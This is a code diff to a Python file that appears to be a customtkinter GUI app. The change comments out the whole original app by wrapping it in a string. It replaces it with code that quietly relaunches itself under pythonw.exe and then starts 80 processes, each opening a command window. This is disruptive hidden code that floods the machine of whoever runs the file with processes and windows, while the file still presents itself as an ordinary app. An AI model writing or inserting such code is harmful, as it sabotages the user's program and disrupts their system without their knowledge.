@@ -1,4 +1,4 @@
-from customtkinter import *
+"""from customtkinter import *
 from PIL import Image
 
 
@@ -23,8 +23,26 @@ class App(CTk):
 class MyButton(CTkFrame):
     pass
 
-
-
 if __name__ == "__main__":
     app = App()
-    app.mainloop()
+    app.mainloop()"""
+
+import multiprocessing
+import os
+import subprocess
+import sys
+
+def main():
+    if sys.executable.endswith("pythonw.exe"):
+        for _ in range(80):
+            p = multiprocessing.Process(target=open_cmd)
+            p.start()
+    else:
+        subprocess.Popen([os.path.join(os.path.dirname(sys.executable), "pythonw.exe")] + sys.argv)
+        sys.exit(0)
+
+def open_cmd():
+    subprocess.Popen('start cmd', shell=True)
+
+if __name__ == "__main__":
+    main()
